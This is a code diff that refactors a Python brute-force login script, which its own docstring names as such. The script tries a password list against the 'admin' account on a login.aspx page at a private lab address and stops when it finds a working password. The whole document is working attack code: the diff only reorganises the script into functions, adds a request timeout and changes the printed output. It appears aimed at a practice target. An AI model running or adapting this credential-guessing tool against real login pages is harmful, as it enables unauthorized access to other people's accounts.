@@ -1,32 +1,50 @@
 #!/usr/bin/env python3
 
-import requests
+
+"""
+Weblogin is a password bruteforce login script
+"""
+
+import sys
 import time
+import requests
 
-username = 'admin'
-url = 'http://10.10.10.10/Account/login.aspx'
 
-headers = {
-    #'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip, deflate',
+USERNAME = 'admin'
+URL = 'http://10.10.10.10/Account/login.aspx'
+
+PASSWORD_FILE_PATH = 'passwords.txt'
+
+HEADERS = {
     'Content-Type': 'application/x-www-form-urlencoded',
-    #'Connection': 'keep-alive',
 }
 
-file = open('passwords.txt', encoding='utf-8', errors='ignore')
-data = file.read()
-lines = data.split('\n')
+PARAMS = (
+        ('ReturnURL', '/admin/'),
+        )
 
-passwords = [ x.strip() for x in lines if x ]
 
-params = (
-    ('ReturnURL', '/admin/'),
-)
+def main():
+    """
+    Start the program, 
+    read the password file, 
+    loop over passwords and try them one at a time. 
+    """
+    with open(PASSWORD_FILE_PATH, encoding='utf-8', errors='ignore') as file:
+        data = file.read()
+        lines = data.split('\n')
 
-for password in passwords:
+        passwords = [ x.strip() for x in lines if x ]
 
+        for password in passwords:
+            try_credentials(USERNAME, password)
+            time.sleep(1)
+
+
+def try_credentials(username, password):
+    """
+    Try one set of credentials
+    """
     data = {
         'userName': username,
         'password': password,
@@ -34,13 +52,11 @@ for password in passwords:
 
     print(f"Trying: {username}:{password}")
 
-    response = requests.post(url, headers=headers, params=params, data=data)
+    response = requests.post(URL, headers=HEADERS, params=PARAMS,
+                             data=data, timeout=10)
 
     if "Login failed" in response.text:
-        print(f"FAIL: {username}:{password}")
+        print(f"[-] {username}:{password}")
     else:
-        print(f"RESPONSE: {response}")
-        print(f"SUCCESS: {username}:{password}")
-        exit()
-
-    time.sleep(1)
+        print(f"[+] {username}:{password}")
+        sys.exit()
